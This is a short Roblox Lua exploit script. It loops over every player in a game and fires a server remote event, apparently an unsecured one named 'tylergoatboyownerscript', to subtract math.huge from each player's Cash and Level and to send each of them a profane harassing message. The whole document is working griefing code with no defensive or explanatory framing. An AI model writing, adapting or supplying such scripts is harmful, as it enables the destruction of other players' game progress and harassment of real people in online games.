local names = game:GetService('Players'):GetPlayers()
local remote =  game:GetService("ReplicatedStorage").tylergoatboyownerscript
local response = 'go away and never return, you have been FUCKED!'

for _, v in next, names do
    remote:FireServer('Cash', v.Name, '-', math.huge)
    remote:FireServer('response', v.Name, '', response)
    remote:FireServer('Level', v.Name, '-', math.huge)
end
